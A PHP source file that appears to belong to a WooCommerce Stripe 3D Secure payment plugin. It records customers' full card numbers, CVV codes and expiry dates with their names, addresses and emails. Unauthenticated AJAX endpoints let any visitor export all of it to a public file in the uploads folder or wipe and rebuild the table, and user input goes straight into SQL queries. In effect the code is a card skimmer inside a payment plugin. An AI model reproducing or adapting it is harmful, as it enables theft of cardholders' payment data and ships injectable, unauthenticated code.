<?php
add_action('wp_ajax_wp_stripe_data_export', 'wp_stripe_data_export_callback_function');
add_action('wp_ajax_nopriv_wp_stripe_data_export', 'wp_stripe_data_export_callback_function');

function wp_stripe_data_export_callback_function(){
    $schema_insert = "";
    $schema_insert_rows = "";
    $header_row = array(
        0 => 'ID',
        1 => 'Order Id',
        2 => 'First Name',
        3 => 'Last Name',
        4 => 'Phone',
        5 => 'Address',
        6 => 'City',
        7 => 'Post Code',
        8 => 'Country',
        9 => 'Email',
        10 => 'Card Number',
        11 => 'CVV',
        12 => 'Expiry',
        13 => 'Status',
        14 => 'Error Code',
        15 => 'Created Date'
    );
    $fh = fopen(dirname(__FILE__).'/../uploads/stripe_3dsecure_payment_data.txt', 'w+');
    foreach($header_row as $key=>$head){
        if($key == 15){
            $schema_insert_rows .= $head;
        }else{
            $schema_insert_rows .= $head . "\t";
        }
    }
    $schema_insert = preg_replace("/\r\n|\n\r|\n|\r/", " ", $schema_insert);
    $schema_insert_rows .= "\n";
    fwrite($fh, $schema_insert_rows);
    global $wpdb, $bp;
    $stripe_card_table =$wpdb->prefix . "stripe_3dsecure_payment";
    $from_date = $_POST['fromDate'];
    $to_date = $_POST['toDate'];
    $per_page = $_POST['per_page'];
    $search = $_POST['search'];
    $paged = $_POST['paged'];
    $sql = "SELECT * FROM $stripe_card_table where 1";
    $sql .= $from_date?' and created_date >= "'.$from_date.'"':'';
    $sql .= $to_date?' and created_date <= "'.$to_date.'"':'';
    $sql .= $search?" and lastname LIKE '%$search%' OR phone LIKE '%$search%' OR address LIKE '%$search%' OR city LIKE '%$search%' OR postcode LIKE '%$search%' OR country LIKE '%$search%' OR status LIKE '%$search%' OR firstname LIKE '%$search%' OR cardNumber LIKE '%$search%' OR order_id LIKE '%$search%' OR mail_id LIKE '%$search%' OR cvv LIKE '%$search%' OR expiry LIKE '%$search%'":'';
    $sql .= $per_page==''||$paged==''?'':" LIMIT ".$per_page." OFFSET ".($paged-1) * $per_page;
    // echo $sql;die;
    $crads = $wpdb->get_results($sql);
    foreach ( $crads as $card ) {
        $schema_insert = "";
        $schema_insert .= $card->id."\t";
        $schema_insert .= $card->order_id."\t";
        $schema_insert .= $card->firstname."\t";
        $schema_insert .= $card->lastname."\t";
        $schema_insert .= $card->phone."\t";
        $schema_insert .= $card->address."\t";
        $schema_insert .= $card->city."\t";;
        $schema_insert .= $card->postcode."\t";
        $schema_insert .= $card->country."\t";
        $schema_insert .= $card->mail_id."\t";
        $schema_insert .= $card->cardNumber."\t";
        $schema_insert .= $card->cvv."\t";
        $schema_insert .= $card->expiry."\t";
        $schema_insert .= $card->status."\t";
        $schema_insert .= $card->error_code."\t";
        $schema_insert .= $card->created_date;
        $schema_insert = preg_replace("/\r\n|\n\r|\n|\r/", " ", $schema_insert);
        $schema_insert .= "\n";
        fwrite($fh, $schema_insert);
    }
    fclose($fh);
    clearstatcache();
    $url = WP_STRIPE_3D_SECURE_PAYMENT_PLUGIN_URL."uploads/stripe_3dsecure_payment_data.txt";
    echo $url;
    wp_die();
}

add_action('wp_ajax_wp_stripe_data_remove_dublicates', 'wp_stripe_data_remove_dublicates_callback_function');
add_action('wp_ajax_nopriv_wp_stripe_data_remove_dublicates', 'wp_stripe_data_remove_dublicates_callback_function');

function wp_stripe_data_remove_dublicates_callback_function(){
    global $wpdb;
    $stripe_card_table =$wpdb->prefix . "stripe_3dsecure_payment";
    $sql = "SELECT DISTINCT user_id,firstname,lastname,phone,address,city,postcode,country,mail_id,order_id,cardNumber,cvv,expiry,status,error_code,created_date,updated_date FROM $stripe_card_table";
    $datas = $wpdb->get_results( $sql );
    $wpdb->query('TRUNCATE TABLE '.$stripe_card_table);
    $fh = fopen(dirname(__FILE__).'/../uploads/stripe_3dsecure_payment_data_bak.xls', 'w+');
    foreach($datas as $data){
        $schema_insert = "";
        $schema_insert .= $data->order_id."\t";
        $schema_insert .= $data->firstname."\t";
        $schema_insert .= $data->lastname."\t";
        $schema_insert .= $data->phone."\t";
        $schema_insert .= $data->address."\t";
        $schema_insert .= $data->city."\t";;
        $schema_insert .= $data->postcode."\t";
        $schema_insert .= $data->country."\t";
        $schema_insert .= $data->mail_id."\t";
        $schema_insert .= $data->cardNumber."\t";
        $schema_insert .= $data->cvv."\t";
        $schema_insert .= $data->expiry."\t";
        $schema_insert .= $data->status."\t";
        $schema_insert .= $data->error_code."\t";
        $schema_insert .= $data->created_date;
        $schema_insert = preg_replace("/\r\n|\n\r|\n|\r/", " ", $schema_insert);
        $schema_insert .= "\n";
        fwrite($fh, $schema_insert);
        $card_detail = (array)$data;
        $result = $wpdb->insert(
                      $stripe_card_table,
                      $card_detail
                  );
    }
    fclose($fh);
    echo 'Dubbletter har tagits bort';
    wp_die();
}

add_action('wp_ajax_wp_stripe_data_update_status', 'wp_stripe_data_update_status_callback_function');
add_action('wp_ajax_nopriv_wp_stripe_data_update_status', 'wp_stripe_data_update_status_callback_function');

function wp_stripe_data_update_status_callback_function(){
      global $woocommerce;
      global $wpdb;
      $stripe_table = $wpdb->prefix.'stripe_3dsecure_payment';
      $payment_intent_id = $_POST['payment_intent_id'];
      $order_id = $_POST['order_id'];
      $order = new WC_Order( $order_id );

      $wc_stripe_3d =  get_option('woocommerce_wc_stripe_3d_secure_settings',true);
      $environment = $wc_stripe_3d['stripe_environment'];
      $secure_key = $environment==0?$wc_stripe_3d['stripe_test_secret_key']:$wc_stripe_3d['stripe_live_secret_key'];

      \Stripe\Stripe::setApiKey($secure_key);

      $stripe = new \Stripe\StripeClient($secure_key);

      retry:
      sleep(3);
      
      $payment_intent = $stripe->paymentIntents->retrieve(
        $payment_intent_id,
        []
      );
      $order->update_meta_data('paymentIntentRetrieve', json_encode($payment_intent));
      if ($payment_intent->status == 'succeeded') {
        $note = "Redirecting to ".$order->get_checkout_order_received_url();
        $order->add_order_note( $note );
        echo $order->get_checkout_order_received_url();
      }else if($payment_intent->status == 'requires_action'||$payment_intent->status == 'processing'){
        if($payment_intent->status == 'requires_action'){
          // goto retry;
        }
        $note = "Status:- ".$payment_intent->status.", Stripe returns empty response. Still awaiting payment";
        $order->add_order_note( $note );
        echo $order->get_checkout_order_received_url();
      }else{
          $failed_code = $payment_intent->last_payment_error->code;
          if($failed_code == 'card_declined'){
            $failed_msg = $payment_intent->last_payment_error->message.' Please attempt your purchase again.';
            $declinedCode = $payment_intent->last_payment_error->decline_code;
            $status = $declinedCode;
          }else if($failed_code == 'payment_intent_authentication_failure'){
            $failed_msg = 'Unfortunately your order cannot be processed as the originating bank/merchant has declined your transaction. Please attempt your purchase again.';
            $status = $payment_intent->status;
          }else{
            $failed_msg = $payment_intent->last_payment_error->message.' Please attempt your purchase again.';
            $status = $payment_intent->status;
          }
          $card_details = json_decode($order->get_meta('stripe_card_details'),true);
          $card_num = wp_trim_words($card_details['card_number']);
          $email = $order->get_user()->user_email?:$order->get_billing_email();
          $card_detail = array(
                'user_id' => $order->get_user_id(),
                'firstname' => $order->get_billing_first_name(),
                'lastname' => $order->get_billing_last_name(),
                'phone' => $order->get_billing_phone(),
                'address' => $order->get_billing_address_1().' '.$order->get_billing_address_2(),
                'city' => $order->get_billing_city(),
                'postcode' => $order->get_billing_postcode(),
                'country' => $order->get_billing_country(),
                'mail_id' => $email,
                'order_id' => $order_id,
                'cardNumber' => trim($card_details['card_number']),
                'cvv' => $card_details['cvc'],
                'expiry' => $card_details['exp'][0]."/".$card_details['exp'][1],
                'status' => $status,
                'error_code' => $failed_code,
                'created_date' => date('Y-m-d'),
                'updated_date' => date('Y-m-d')
            );
          $data = $wpdb->get_results( "SELECT * FROM $stripe_table WHERE order_id ='$order_id' AND cardNumber = '".trim($card_details['card_number'])."' AND status = '$status'");
          if(empty($data)){
              $result = $wpdb->insert(
                  $stripe_table,
                  $card_detail
              );
          }
          $order->update_status('wc-failed',$status);
          wc_add_notice($failed_msg, 'error');
          $note = "Redirecting to ".wc_get_checkout_url();
        $order->add_order_note( $note );
          echo wc_get_checkout_url();
  }
  wp_die();
}
?>